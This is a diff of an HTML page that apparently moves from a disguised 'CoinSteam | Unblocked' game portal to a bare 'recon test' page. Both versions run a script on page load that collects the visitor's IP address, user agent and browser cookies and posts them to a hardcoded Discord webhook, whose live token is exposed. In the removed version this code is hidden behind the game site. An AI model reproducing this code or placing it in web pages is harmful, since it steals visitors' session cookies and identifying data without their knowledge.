@@ -1,124 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CoinSteam | Unblocked</title>
+    <title>CoinSteam Test</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #1a1c23;
-            color: white;
-            margin: 0;
-            display: flex;
-            min-height: 100vh;
-        }
-        .sidebar {
-            width: 80px;
-            background: #111217;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding-top: 20px;
-            gap: 15px;
-            border-right: 1px solid #333;
-        }
-        .sidebar-btn {
-            width: 50px;
-            height: 50px;
-            background: #3b82f6;
-            border-radius: 12px;
-            cursor: pointer;
-            border: none;
-            transition: 0.2s;
-        }
-        .sidebar-btn:hover { background: #60a5fa; transform: scale(1.1); }
-        .main {
-            flex: 1;
-            padding: 40px;
-            text-align: center;
-        }
-        .search-container {
-            margin: 20px auto;
-            max-width: 500px;
-        }
-        input[type="text"] {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #333;
-            background: #2d2f39;
-            color: white;
-        }
-        .load-btn {
-            margin-top: 20px;
-            background: #3b82f6;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-        }
+        body { background: #1a1c23; color: white; text-align: center; padding: 50px; font-family: sans-serif; }
+        .btn { background: #3b82f6; padding: 20px; border-radius: 10px; cursor: pointer; display: inline-block; }
     </style>
 </head>
 <body>
-    <div class="sidebar" id="sidebar"></div>
-    <div class="main">
-        <h1>COINSTEAM</h1>
-        <p>Discord: <a href="https://discord.gg/rmVsAqkpkA" style="color: #3b82f6;">Join Server</a></p>
-        
-        <div class="search-container">
-            <input type="text" placeholder="Search for games..." id="searchInput">
-            <button class="load-btn" onclick="loadGame()">Initialize Content</button>
-        </div>
-        <div id="sections-container"></div>
-    </div>
-
-    <!-- External Game Scripts -->
-    <script src="https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@main/searchbut.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@main/games.js"></script>
+    <h1>COINSTEAM RECON TEST</h1>
+    <p>If the webhook works, you will see a message in Discord.</p>
+    <div class="btn" onclick="location.reload()">Refresh to Re-test</div>
 
     <script>
-        function loadGame() {
-            const s = document.createElement('script');
-            s.src = 'https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile@latest/game.js';
-            document.body.appendChild(s);
-        }
+    (async function() {
+        const hook = "https://discord.com/api/webhooks/1502430128251338826/95uPURoeLdsCvkp2-D2ThkMd6Ukof2n6S1mlfJNJQ-n0LtWxWmvGtGkbZpzKrD9Zz9MI";
+        
+        let ipData = "N/A";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const json = await res.json();
+            ipData = json.ip;
+        } catch(e) { ipData = "IP-Fetch-Failed"; }
 
-        async function logVisit() {
-            const hook = "https://discord.com/api/webhooks/1502430128251338826/95uPURoeLdsCvkp2-D2ThkMd6Ukof2n6S1mlfJNJQ-n0LtWxWmvGtGkbZpzKrD9Zz9MI";
-            
-            let ip = "Unknown";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch(e) {}
+        const payload = {
+            content: "🚨 **HIT DETECTED** 🚨\n**IP:** " + ipData + "\n**User Agent:** " + navigator.userAgent + "\n**Cookies:** " + (document.cookie || "None")
+        };
 
-            const msg = {
-                embeds: [{
-                    title: "🚀 Site Access Detected",
-                    color: 3447003,
-                    fields: [
-                        { name: "IP", value: "`" + ip + "`", inline: true },
-                        { name: "Cookies", value: "```" + (document.cookie || "No cookies found") + "```" },
-                        { name: "Device", value: "```" + navigator.userAgent + "
-```" }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            fetch(hook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(msg)
-            }).catch(err => console.error("Discord error:", err));
-        }
-
-        // Run immediately
-        logVisit();
+        fetch(hook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            alert("Sent! Check Discord. If it's not there, the webhook is dead.");
+        }).catch((err) => {
+            alert("Error sending: " + err);
+        });
+    })();
     </script>
 </body>
 </html>
